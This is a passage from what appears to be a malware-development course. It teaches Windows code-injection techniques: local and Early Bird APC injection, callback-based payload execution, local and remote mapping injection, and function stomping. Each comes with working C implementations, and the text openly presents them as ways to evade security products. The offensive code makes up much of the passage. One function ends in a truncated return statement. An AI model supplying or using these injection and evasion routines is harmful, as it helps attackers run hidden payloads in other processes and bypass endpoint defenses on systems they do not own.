        // The 5th parameter should be 'TRUE'
		WaitForMultipleObjectsEx(1, &hEvent, TRUE, INFINITE, TRUE);
		CloseHandle(hEvent);
	}
}
```

**Using??`MsgWaitForMultipleObjectsEx`**

```c
VOID AlertableFunction4() {

	HANDLE hEvent = CreateEvent(NULL, NULL, NULL, NULL);
	if (hEvent) {
        // The 5th parameter should be 'MWMO_ALERTABLE'
		MsgWaitForMultipleObjectsEx(1, &hEvent, INFINITE, QS_KEY, MWMO_ALERTABLE);
		CloseHandle(hEvent);
	}
}

```

**Using??`SignalObjectAndWait`**

```c
VOID AlertableFunction5() {
	
	HANDLE hEvent1 = CreateEvent(NULL, NULL, NULL, NULL);
	HANDLE hEvent2 = CreateEvent(NULL, NULL, NULL, NULL);

	if (hEvent1 && hEvent2) {
        // The 4th parameter should be 'TRUE'
		SignalObjectAndWait(hEvent1, hEvent2, INFINITE, TRUE);
		CloseHandle(hEvent1);
		CloseHandle(hEvent2);
	}
}
```

### Suspended Threads

`QueueUserAPC`??can also succeed if the target thread is created in a suspended state. If this method is used to execute the payload,??`QueueUserAPC`??should be called first and then the suspended thread should be resumed next. Again, the thread must be created in a suspended state, suspending an existing thread will not work.

The code shared in this module demonstrates APC injection via an alertable and suspended thread.

### APC Injection Implementation Logic

To summarize, the implementation logic will be as follows:

1. First, create a thread that runs one of the previously mentioned functions to place it in an alertable state.
    
2. Inject the payload into memory.
    
3. The thread handle and payload base address will be passed as input parameters to??`QueueUserAPC`.
    

### APC Injection Function

`RunViaApcInjection`??is a function that performs APC Injection and requires 3 arguments:

- `hThread`??- A handle to an alertable or suspended thread.
    
- `pPayload`??- A pointer to the payload's base address.
    
- `sPayloadSize`??- The size of the payload.
    

```c
BOOL RunViaApcInjection(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

	PVOID pAddress = NULL;
	DWORD dwOldProtection = NULL;

	
	pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		printf("\t[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	memcpy(pAddress, pPayload, sPayloadSize);
	

	if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("\t[!] VirtualProtect Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// If hThread is in an alertable state, QueueUserAPC will run the payload directly
	// If hThread is in a suspended state, the payload won't be executed unless the thread is resumed after
	if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
		printf("\t[!] QueueUserAPC Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}
```

  

### Demo - APC Injection Using An Alertable Thread

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/apc-demo-1-109284381-1875d55b-1574-4421-b4e9-6f6948a5a316.png)

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/apc-demo-1-209284381-1875d55b-1574-4421-b4e9-6f6948a5a316.png)

  

### Demo - APC Injection Using a Suspended Thread

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/apc-demo-2-109284381-1875d55b-1574-4421-b4e9-6f6948a5a316.png)

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/apc-demo-2-209284381-1875d55b-1574-4421-b4e9-6f6948a5a316.png)
# Early Bird APC Injection

### Introduction

In the previous module,??`QueueUserAPC`??was used to perform local APC injection. In this module, the same API will be used to execute the payload in a remote process. Although the approach will slightly differ, the method used is the same.

By now it should be well understood that APC injection requires either a suspended or an alertable thread to successfully execute the payload. However, it is difficult to come across threads that are in these states, especially ones that are operating under normal user privileges.

The solution for this is to create a suspended process using the??`CreateProcess`??WinAPI and use the handle to its suspended thread. The suspended thread meets the criteria to be used in APC injection. This method is known as Early Bird APC Injection.

### Early Bird Implementation Logic (1)

The implementation logic of this technique will be as follows:

1. Create a suspended process by using the??`CREATE_SUSPENDED`??flag.
    
2. Write the payload to the address space of the new target process.
    
3. Get the suspended thread's handle from??`CreateProcess`??along with the payload's base address and pass them to??`QueueUserAPC`.
    
4. Resume the thread using the??`ResumeThread`??WinAPI to execute the payload.
    

### Early Bird Implementation Logic (2)

The implementation logic explained in the previous section is straightforward. This section introduces an alternative way of implementing Early Bird APC Injection.

`CreateProcess`??will still be used, but the??[process creation flag](https://learn.microsoft.com/en-us/windows/desktop/ProcThread/process-creation-flags)??will be changed from??`CREATE_SUSPENDED`??to??`DEBUG_PROCESS`. The??`DEBUG_PROCESS`??flag will create the new process as a debugged process and make the local process its debugger. When a process is created as a debugged process, a breakpoint will be placed in its entry point. This pauses the process and waits for the debugger (i.e. the malware) to resume execution.

When this occurs, the payload is injected into the target process to be executed using the??`QueueUserAPC`??WinAPI. Once the payload is injected and the remote debugged thread is queued to run the payload, the local process can be detached from the target process using the??[DebugActiveProcessStop](https://learn.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-debugactiveprocessstop)??WinAPI which stops the remote process from being debugged.

`DebugActiveProcessStop`??requires only one parameter which is the PID of the debugged process that can be fetched from the??`PROCESS_INFORMATION`??structure populated by??`CreateProcess`.

#### Updated Implementation Logic

The updated implementation will be as follows:

1. Create a debugged process by setting the??`DEBUG_PROCESS`??flag.
    
2. Write the payload to the address space of the new target process.
    
3. Get the debugged thread's handle from??`CreateProcess`??along with the payload's base address and pass them to??`QueueUserAPC`.
    
4. Stop the debugging of the remote process using??`DebugActiveProcessStop`??which resumes its threads and executes the payload.
    

### Early Bird APC Injection Function

`CreateSuspendedProcess2`??is a function that performs Early Bird APC Injection and requires 4 arguments:

- `lpProcessName`??- The name of the process to create.
    
- `dwProcessId`??- A pointer to a DWORD which will receive the newly created process's PID.
    
- `hProcess`??- Pointer to a HANDLE that will receive the newly created process's handle.
    
- `hThread`??- Pointer to a HANDLE that will receive the newly created process's thread.
    

```c
BOOL CreateSuspendedProcess2(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread) {

	CHAR lpPath   [MAX_PATH * 2];
	CHAR WnDr     [MAX_PATH];

	STARTUPINFO            Si    = { 0 };
	PROCESS_INFORMATION    Pi    = { 0 };

	// Cleaning the structs by setting the element values to 0
	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	// Setting the size of the structure
	Si.cb = sizeof(STARTUPINFO);

	// Getting the %WINDIR% environment variable path (That is generally 'C:\Windows')
	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
		printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Creating the target process path 
	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
	printf("\n\t[i] Running : \"%s\" ... ", lpPath);

	// Creating the process
	if (!CreateProcessA(
		NULL,
		lpPath,
		NULL,
		NULL,
		FALSE,
		DEBUG_PROCESS,		// Instead of CREATE_SUSPENDED		
		NULL,
		NULL,
		&Si,
		&Pi)) {
		printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("[+] DONE \n");

	// Filling up the OUTPUT parameter with CreateProcessA's output
	*dwProcessId        = Pi.dwProcessId;
	*hProcess           = Pi.hProcess;
	*hThread            = Pi.hThread;

	// Doing a check to verify we got everything we need
	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
		return TRUE;
	
	return FALSE;
}
```

### Demo

The image below shows the newly created target process in a debug state. A debugged process is highlighted in purple in Process Hacker.

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/demo-109330271-93c3e529-dfea-4868-ad56-48ce90efe172.png)

  

Next, the payload is written to the target process.

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/demo-209330277-04b3a674-e5f7-41b1-95a3-423e34d2f5aa.png)

  

Finally, the payload is executed.

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/demo-309330284-92aec1dc-b899-49a8-a170-f9845cbe5246.png)
# 4.9 Callback Code Execution

### Introduction

Callback functions are used to handle events or to perform an action when a condition is met. They are used in a variety of scenarios in the Windows operating system, including event handling, window management, and multithreading. Microsoft's definition of a callback function is as follows:

_A callback function is code within a managed application that helps an unmanaged DLL function complete a task. Calls to a callback function pass indirectly from a managed application, through a DLL function, and back to the managed implementation._

Several ordinary Windows APIs possess the ability to execute payloads using callbacks. Using them provides a benefit against security solutions since these functions may appear benign and can potentially evade some security solutions.

### Abusing Callback Functions

Windows callbacks can be executed using a function pointer. To run the payload, the address of the payload must be passed instead of a valid callback function pointer. Callback Execution can replace the use of the??`CreateThread`??WinAPI and other thread-related techniques for payload execution. Additionally, there is no need to use the functions correctly by passing the appropriate parameters. The return value or functionality of these functions is not of any concern.

One important point about callback functions is that they only work in the local process address space and cannot be used to perform remote code injection techniques.

### Sample Callback Functions

The following functions are all capable of execution callback functions.

**[CreateTimerQueueTimer's](https://learn.microsoft.com/en-us/windows/win32/api/threadpoollegacyapiset/nf-threadpoollegacyapiset-createtimerqueuetimer)??3rd parameter**

```c
BOOL CreateTimerQueueTimer(
  [out]          PHANDLE             phNewTimer,
  [in, optional] HANDLE              TimerQueue,
  [in]           WAITORTIMERCALLBACK Callback,      // here
  [in, optional] PVOID               Parameter,
  [in]           DWORD               DueTime,
  [in]           DWORD               Period,
  [in]           ULONG               Flags
);
```

  

**[EnumChildWindows's](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-enumchildwindows)??2nd parameter**

```c
BOOL EnumChildWindows(
  [in, optional] HWND        hWndParent,
  [in]           WNDENUMPROC lpEnumFunc,    // here
  [in]           LPARAM      lParam
);
```

  

**[EnumUILanguagesW's](https://learn.microsoft.com/en-us/windows/win32/api/winnls/nf-winnls-enumuilanguagesw)??1st parameter**

```c
BOOL EnumUILanguagesW(
  [in] UILANGUAGE_ENUMPROCW lpUILanguageEnumProc,     // here
  [in] DWORD                dwFlags,
  [in] LONG_PTR             lParam
);
```

  

**[VerifierEnumerateResource's](https://learn.microsoft.com/en-us/windows/win32/api/avrfsdk/nf-avrfsdk-verifierenumerateresource)??4th parameter**

```c
ULONG VerifierEnumerateResource(
  HANDLE                           Process,
  ULONG                            Flags,
  ULONG                            ResourceType,
  AVRF_RESOURCE_ENUMERATE_CALLBACK ResourceCallback,     // here
  PVOID                            EnumerationContext
);
```

The following sections will provide detailed explanations for each of these functions. The payload used in the code samples is stored in the??`.text`??section of the binary. This allows the shellcode to have the required??`RX`??memory permissions without having to allocate executable memory using??`VirtualAlloc`??or other memory allocation functions.

### Using CreateTimerQueueTimer

`CreateTimerQueueTimer`??creates a new timer and adds it to the specified timer queue. The timer is specified using a callback function that is called when the timer expires. The callback function is executed by the thread that created the timer queue.

The snippet below runs the code located at??`Payload`??as a callback function.

```c
HANDLE hTimer = NULL;

if (!CreateTimerQueueTimer(&hTimer, NULL, (WAITORTIMERCALLBACK)Payload, NULL, NULL, NULL, NULL)){
	printf("[!] CreateTimerQueueTimer Failed With Error : %d \n", GetLastError());
	return -1;
}
```

### Using EnumChildWindows

`EnumChildWindows`??allows a program to enumerate the child windows of a parent window. It takes a parent window handle as an input and applies a user-defined callback function to each of the child windows, one at a time. The callback function is called for each child window, and it receives the child window handle and a user-defined value as parameters.

The snippet below runs the code located at??`Payload`??as a callback function.

```c
	if (!EnumChildWindows(NULL, (WNDENUMPROC)Payload, NULL)) {
		printf("[!] EnumChildWindows Failed With Error : %d \n", GetLastError());
		return -1;
	}
```

### Using EnumUILanguagesW

`EnumUILanguagesW`??enumerates the user interface (UI) languages that are installed on the system. It takes a callback function as a parameter and applies the callback function to each UI language, one at a time. Note that any value instead of??`MUI_LANGUAGE_NAME`??flag still works.

The snippet below runs the code located at??`Payload`??as a callback function.

```c
	if (!EnumUILanguagesW((UILANGUAGE_ENUMPROCW)Payload, MUI_LANGUAGE_NAME, NULL)) {
		printf("[!] EnumUILanguagesW Failed With Error : %d \n", GetLastError());
		return -1;
	}
```

### Using VerifierEnumerateResource

`VerifierEnumerateResource`??is used to enumerate the resources in a specified module. Resources are data that are stored in a module (such as an executable or a dynamic-link library) and can be accessed by the module or by other modules at runtime. Examples of resources include strings, bitmaps, and dialog box templates.

`VerifierEnumerateResource`??is exported from??`verifier.dll`, therefore the module must be dynamically loaded using the??`LoadLibrary`??and??`GetProcAddress`??WinAPIs to access the function.

Note that if the??`ResourceType`??parameter is not equal to??`AvrfResourceHeapAllocation`??then the payload will not be executed.??`AvrfResourceHeapAllocation`??allows the function to enumerate heap allocation, including heap metadata blocks.

```c
	HMODULE hModule = NULL;
	fnVerifierEnumerateResource pVerifierEnumerateResource = NULL;

	hModule = LoadLibraryA("verifier.dll");
	if (hModule == NULL){
		printf("[!] LoadLibraryA Failed With Error : %d \n", GetLastError());
		return -1;
	}

	pVerifierEnumerateResource = GetProcAddress(hModule, "VerifierEnumerateResource");
	if (pVerifierEnumerateResource == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		return -1;
	}

	// Must set the AvrfResourceHeapAllocation flag to run the payload
	pVerifierEnumerateResource(GetCurrentProcess(), NULL, AvrfResourceHeapAllocation, (AVRF_RESOURCE_ENUMERATE_CALLBACK)Payload, NULL);
```

### Conclusion

This module reviewed several callback functions and demonstrated their usage for payload execution. Callback functions are only beneficial when the payload is running in the memory address space of the local process.

Microsoft's documentation page can be searched to discover additional callback functions. Additionally, a??[GitHub repository](https://github.com/aahmad097/AlternativeShellcodeExec)??was created that contains a list of the most common callback functions.
# 5.0 Local Mapping Injection

### Introduction

So far, in all the previous implementations a private memory type was used to store the payload during execution. Private memory is allocated using??`VirtualAlloc`??or??`VirtualAllocEx`. The following image shows the allocated private memory in the "LocalThreadHijacking" implementation that contained the payload.

![Image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/local-map-inject-109424404-c8e38d0c-cf1a-401a-b881-e1d50f0fb1dd.png)

### Mapped Memory

The process of allocating private memory is highly monitored by security solutions due to its widespread usage by malware. To avoid these commonly monitored WinAPIs such as??`VirtualAlloc/Ex`??and??`VirtualProtect/Ex`, mapping injection uses??`Mapped`??memory type using different WinAPIs such as??`CreateFileMapping`??and??`MapViewOfFile`.

It is also worth noting that the??`VirtualProtect/Ex`??WinAPIs cannot be used to change the memory permissions of mapped memory.

### Local Mapping Injection

This section explains the WinAPIs required to perform local mapping injection.

#### CreateFileMapping

[CreateFileMapping](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createfilemappinga)??creates a file mapping object that provides access to the contents of a file through memory mapping techniques. It allows a process to create a virtual memory space that maps to the contents of a file on disk or to another memory location. The function returns a handle to the file mapping object.

```c
HANDLE CreateFileMappingA(
  [in]           HANDLE                hFile,
  [in, optional] LPSECURITY_ATTRIBUTES lpFileMappingAttributes,     // Not Required - NULL
  [in]           DWORD                 flProtect,
  [in]           DWORD                 dwMaximumSizeHigh,           // Not Required - NULL
  [in]           DWORD                 dwMaximumSizeLow,
  [in, optional] LPCSTR                lpName                       // Not Required - NULL   
);
```

The 3 required parameters for this technique are explained below. The parameters marked as not required can be set to??`NULL`.

- `hFile`??- A handle to a file from which to create a file mapping handle. Since creating file mapping from a file is not required in the implementation, the??`INVALID_HANDLE_VALUE`??flag can be used instead. The??`INVALID_HANDLE_VALUE`??flag is explained by Microsoft:

_If hFile is INVALID_HANDLE_VALUE, the calling process must also specify a size for the file mapping object in the dwMaximumSizeHigh and dwMaximumSizeLow parameters. In this scenario, CreateFileMapping creates a file mapping object of a specified size that is backed by the system paging file instead of by a file in the file system._

Setting this flag allows the function to perform its task without using a file from disk, and instead the file mapping object is created in memory with a size specified by the??`dwMaximumSizeHigh`??or??`dwMaximumSizeLow`??parameters.

- `flProtect`??- Specifies the page protection of the file mapping object. In this implementation, it will be set as??`PAGE_EXECUTE_READWRITE`. Note that this does not create an??`RWX`??section, but instead it specifies that it can be created later on. If it had been set to??`PAGE_READWRITE`, then it would not be possible to execute the payload later on.
    
- `dwMaximumSizeLow`??- The size of the file mapping handle returned. The value of this will be the payload's size.
    

#### MapViewOfFile

[MapViewOfFile](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-mapviewoffile)??maps a view of a file mapping object into the address space of a process. It takes a handle to the file mapping object and the desired access rights and returns a pointer to the beginning of the mapping in the process's address space.

```c
LPVOID MapViewOfFile(
  [in] HANDLE     hFileMappingObject,
  [in] DWORD      dwDesiredAccess,
  [in] DWORD      dwFileOffsetHigh,           // Not Required - NULL
  [in] DWORD      dwFileOffsetLow,            // Not Required - NULL
  [in] SIZE_T     dwNumberOfBytesToMap
);
```

The 3 required parameters for this technique are explained below. The parameters marked as not required can be set to??`NULL`.

- `hFileMappingObject`??- The returned handle from the??`CreateFileMapping`??WinAPI, which is the file mapping object.
    
- `dwDesiredAccess`??- The type of access to a file mapping object, which determines the page protection of the page created. In other words, the memory permissions of the allocated memory by the??`MapViewOfFile`??call. Since??`CreateFileMapping`??was set to??`PAGE_EXECUTE_READWRITE`, this parameter will use both the??`FILE_MAP_EXECUTE`??and??`FILE_MAP_WRITE`??flags to return valid executable and writable memory, which is what is needed to copy the payload and execute it after.
    

Had the??`PAGE_READWRITE`??flag been used in??`CreateFileMapping`??and the??`FILE_MAP_EXECUTE`??flag was used in??`MapViewOfFile`, then??`MapViewOfFile`??would have failed because executable memory was attempted to be made from a readable and writable??`CreateFileMapping`??object handle which is not possible.

- `dwNumberOfBytesToMap`??- The size of the payload.

### Local Mapping Injection Function

`LocalMapInject`??is a function that performs local mapping injection. It takes 3 arguments:

- `pPayload`??- The payload's base address.
    
- `sPayloadSize`??- The size of the payload.
    
- `ppAddress`??- A pointer to PVOID that receives the mapped memory's base address.
    

The function allocates a locally mapped executable buffer and copies the payload that buffer then returns the base address of the mapped memory.

```c
BOOL LocalMapInject(IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID* ppAddress) {

	BOOL   bSTATE         = TRUE;
	HANDLE hFile          = NULL;
	PVOID  pMapAddress    = NULL;


	// Create a file mapping handle with RWX memory permissions
	// This does not allocate RWX view of file unless it is specified in the subsequent MapViewOfFile call  
	hFile = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, NULL);
	if (hFile == NULL) {
		printf("[!] CreateFileMapping Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	// Maps the view of the payload to the memory 
	pMapAddress = MapViewOfFile(hFile, FILE_MAP_WRITE | FILE_MAP_EXECUTE, NULL, NULL, sPayloadSize);
	if (pMapAddress == NULL) {
		printf("[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}
	
    // Copying the payload to the mapped memory
	memcpy(pMapAddress, pPayload, sPayloadSize);
	
_EndOfFunction:
	*ppAddress = pMapAddress;
	if (hFile)
		CloseHandle(hFile);
	return bSTATE;
}

```

### UnmapViewOfFile

[UnmapViewOfFile](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-unmapviewoffile)??is a WinAPI that is used to unmap previously mapped memory, this function should only be called after the payload has finished executing and not while it's still running.??`UnmapViewOfFile`??only requires the base address of the mapped view of a file to be unmapped, which is??`pMapAddress`??in the function above.

### Demo

Allocating a mapped memory buffer

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/local-map-inject-209424404-c8e38d0c-cf1a-401a-b881-e1d50f0fb1dd.png)

  

Copying the payload

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/local-map-inject-309427185-a71d9b01-a6f8-4fd8-be13-25e331ad96d8.png)

  

Executing the payload (Using??`CreateThread`??for simplicity)

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/local-map-inject-409427186-264e5199-4331-4578-84bc-c9c9cba45046.png)
# 5.1 Remote Mapping Injection

### Introduction

The previous module demonstrated a method to perform local payload execution without the need of using private memory. This module demonstrates the same technique on a remote process instead.

### Remote Mapping Injection

This section explains the WinAPIs required to perform remote mapping injection. The steps to perform remote mapping injection are listed below.

1. `CreateFileMapping`??is called to create a file mapping object.
2. `MapViewOfFile`??is then called to map the file mapping object into the local process address space.
3. The payload is moved to the locally allocated memory.
4. A new view of file is mapped into the remote address space of the target process, using??`MapViewOfFile2`, mapping the local view of file into the remote process, and thus our copied payload.

#### MapViewOfFile2

[MapViewOfFile2](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-mapviewoffile2)??maps a view of a file into the address space of a specified, remote process.

```c
PVOID MapViewOfFile2(
  [in]           HANDLE  FileMappingHandle,   // Handle to the file mapping object returned by CreateFileMappingA/W
  [in]           HANDLE  ProcessHandle,       // Target process handle
  [in]           ULONG64 Offset,              // Not required - NULL
  [in, optional] PVOID   BaseAddress,         // Not required - NULL
  [in]           SIZE_T  ViewSize,            // Not required - NULL
  [in]           ULONG   AllocationType,      // Not required - NULL
  [in]           ULONG   PageProtection       // The desired page protection.
);
```

- `FileMappingHandle`??- A HANDLE to a section that is to be mapped into the address space of the specified process.
    
- `ProcessHandle`??- A HANDLE to a process into which the section will be mapped. The handle must have the??`PROCESS_VM_OPERATION`??access mask.
    
- `PageProtection`??- The desired page protection.
    

### Implementation Note

Unlike local mapping injection, it's not necessary to make the locally mapped view of the file executable since the payload is not executed locally. Instead, the??`MapViewOfFile`??uses the??`FILE_MAP_WRITE`??flag in order to copy the payload.??`MapViewOfFile2`??will then map the same bytes to the address space of the target process.

`MapViewOfFile2`??shares the file mapping handle with??`MapViewOfFile`. Therefore, any modifications to the payload in the locally mapped view of the file is reflected in the remote mapped view of the file in the remote process. This is useful for real-world implementations where an encrypted payload needs to be run, as the payload can be mapped to the remote process and decrypted locally, thus decrypting the payload in the remote view of the file for execution.

### Remote Mapping Injection Function

`RemoteMapInject`??is a function that performs remote mapping injection. It takes 4 arguments:

- `hProcess`??- The handle to the target process.
    
- `pPayload`??- The payload's base address.
    
- `sPayloadSize`??- The size of the payload.
    
- `ppAddress`??- A pointer to PVOID that receives the mapped memory's base address.
    

The function allocates a locally mapped readable-writable buffer and then copies the payload to it. It then uses??`MapViewOfFile2`??to map the local payload to a new remote buffer in the target process and finally returns the base address of the mapped memory.

```c
BOOL RemoteMapInject(IN HANDLE hProcess, IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID* ppAddress) {

	BOOL        bSTATE            = TRUE;
	HANDLE      hFile             = NULL;
	PVOID       pMapLocalAddress  = NULL,
                pMapRemoteAddress = NULL;

    // Create a file mapping handle with RWX memory permissions
	// This does not allocate RWX view of file unless it is specified in the subsequent MapViewOfFile call  
	hFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, NULL);
	if (hFile == NULL) {
		printf("\t[!] CreateFileMapping Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}
  
    // Maps the view of the payload to the memory 
	pMapLocalAddress = MapViewOfFile(hFile, FILE_MAP_WRITE, NULL, NULL, sPayloadSize);
	if (pMapLocalAddress == NULL) {
		printf("\t[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

    // Copying the payload to the mapped memory
	memcpy(pMapLocalAddress, pPayload, sPayloadSize);

	// Maps the payload to a new remote buffer in the target process
	pMapRemoteAddress = MapViewOfFile2(hFile, hProcess, NULL, NULL, NULL, NULL, PAGE_EXECUTE_READWRITE);
	if (pMapRemoteAddress == NULL) {
		printf("\t[!] MapViewOfFile2 Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	printf("\t[+] Remote Mapping Address : 0x%p \n", pMapRemoteAddress);

_EndOfFunction:
	*ppAddress = pMapRemoteAddress;
	if (hFile)
		CloseHandle(hFile);
	return 
}
```

### UnmapViewOfFile

Recall that??`UnmapViewOfFile`??only takes the base address of the mapped view of a file that is to be unmapped. Calling the??`UnmapViewOfFile`??WinAPI to unmap the locally mapped payload is prohibited when the payload is still running because the remote view of the file is a reflection of the local one. Therefore, unmapping the local file map view will cause the remote process to crash since the payload is still active.

### Demo

The target process for this demo is??`Notepad.exe`.

![Image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/remote-map-109431584-4f2ef9e2-3d8e-49ce-9998-b9070c566647.png)

  

The image below shows the locally mapped memory containing the payload. Notice that the permissions on the memory is??`RW`.

![Image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/remote-map-209431586-0863ea8b-fa83-486b-aeac-ff718f759de7.png)

  

`MapViewOfFile2`??maps the same bytes to the address space of the target process,??`notepad.exe`. The remotely mapped memory now contains the payload with??`RWX`??permissions.

![Image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/remote-map-309431587-6d988463-f0aa-4cc2-8252-1b0d1426af2d.png)

  

Executing the payload (Using??`CreateRemoteThread`??for simplicity)

![Image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/remote-map-409431570-6cd31d0b-0dee-4930-97d3-5124112c3e77.png)
# 5.2 Local Function Stomping Injection

### Introduction

The previously demonstrated mapping injection modules were used to avoid the usage of??`VirtualAlloc/Ex`??WinAPI calls. This module will demonstrate another method that avoids the usage of these WinAPIs.

### Function Stomping

The term "stomping" refers to the act of overwriting or replacing the memory of a function or other data structure in a program with different data.

Function stomping is a technique where the original function's bytes are replaced with new code resulting in the function being replaced or no longer working as intended. Instead, the function will execute different logic. To implement this, a sacrificial function address is required to be stomped.

### Choosing a Target Function

Retrieving the address of a function locally is simple, but which function is being retrieved is the main concern with this technique. Overwriting a commonly used function can result in the uncontrolled execution of the payload or the process can crash. Therefore it should be clear that targeting functions exported from??`ntdll.dll`,??`kernel32.dll`??and??`kernelbase.dll`??is risky. Instead, less commonly used functions should be targeted such as??`MessageBox`??since it will be rarely used by the operating system or other applications.

### Using The Stomped Function

When a target function's bytes are replaced with that of the payload's, the function cannot be used anymore unless it is specifically for payload execution. For example, if the target function is??`MessageBoxA`??then the binary should only call??`MessageBoxA`??once, which is when the payload will be executed.

### Local Function Stomping Code

For the code demonstration below, the target function is??[SetupScanFileQueueA](https://learn.microsoft.com/en-us/windows/win32/api/setupapi/nf-setupapi-setupscanfilequeuea). This is a completely random function but is unlikely to cause any problems if it's overwritten. Based on Microsoft's documentation, the function is exported from??`Setupapi.dll`. Therefore the first step would be to load??`Setupapi.dll`??into the local process memory using??`LoadLibraryA`??and then retrieve the function's address using??`GetProcAddress`.

The next step would be to stomp the function and replace it with the payload. Ensure the function can be overwritten by marking its memory region as readable and writable using??`VirtualProtect`. Next, the payload is written into the function's address and finally,??`VirtualProtect`??is used again to mark the region as executable (`RX`??or??`RWX`).

```c

#define		SACRIFICIAL_DLL          "setupapi.dll"
#define		SACRIFICIAL_FUNC         "SetupScanFileQueueA"


// ...

BOOL WritePayload(IN PVOID pAddress, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

	DWORD	dwOldProtection		= NULL;


	if (!VirtualProtect(pAddress, sPayloadSize, PAGE_READWRITE, &dwOldProtection)){
		printf("[!] VirtualProtect [RW] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	memcpy(pAddress, pPayload, sPayloadSize);

	if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect [RWX] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}



int main() {

	PVOID		pAddress	= NULL;
	HMODULE		hModule		= NULL;
	HANDLE		hThread		= NULL;


	printf("[#] Press <Enter> To Load \"%s\" ... ", SACRIFICIAL_DLL);
	getchar();

	printf("[i] Loading ... ");
	hModule = LoadLibraryA(SACRIFICIAL_DLL);
	if (hModule == NULL){
		printf("[!] LoadLibraryA Failed With Error : %d \n", GetLastError());
		return -1;
	}
	printf("[+] DONE \n");



	pAddress = GetProcAddress(hModule, SACRIFICIAL_FUNC);
	if (pAddress == NULL){
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		return -1;
	}


	printf("[+] Address Of \"%s\" : 0x%p \n", SACRIFICIAL_FUNC, pAddress);


	printf("[#] Press <Enter> To Write Payload ... ");
	getchar();
	printf("[i] Writing ... ");
	if (!WritePayload(pAddress, Payload, sizeof(Payload))) {
		return -1;
	}
	printf("[+] DONE \n");



	printf("[#] Press <Enter> To Run The Payload ... ");
	getchar();

	hThread = CreateThread(NULL, NULL, pAddress, NULL, NULL, NULL);
	if (hThread != NULL)
		WaitForSingleObject(hThread, INFINITE);

	printf("[#] Press <Enter> To Quit ... ");
	getchar();

	return 0;

}

```

  

### Inserting DLL Into Binary

Instead of loading the DLL using??`LoadLibrary`??and then retrieving the target function's address with??`GetProcAddress`, it's possible to statically link the DLL into the binary. Using the pragma comment compiler directive allows for this, as shown below.

```c
#pragma comment (lib, "Setupapi.lib") // Adding "setupapi.dll" to the Import Address Table
```

The target function can then be simply retrieved using the address-of-operator (e.g.??`&SetupScanFileQueueA`). The code snippet below updates the previous code snippet to use the pragma comment directive.

```c

#pragma comment (lib, "Setupapi.lib") // Adding "setupapi.dll" to the Import Address Table

// ...


int main() {

	HANDLE		hThread			= NULL;


	printf("[+] Address Of \"SetupScanFileQueueA\" : 0x%p \n", &SetupScanFileQueueA);


	printf("[#] Press <Enter> To Write Payload ... ");
	getchar();
	printf("[i] Writing ... ");
	if (!WritePayload(&SetupScanFileQueueA, Payload, sizeof(Payload))) { // Using the address-of operator
		return -1;
	}
	printf("[+] DONE \n");



	printf("[#] Press <Enter> To Run The Payload ... ");
	getchar();

	hThread = CreateThread(NULL, NULL, SetupScanFileQueueA, NULL, NULL, NULL);
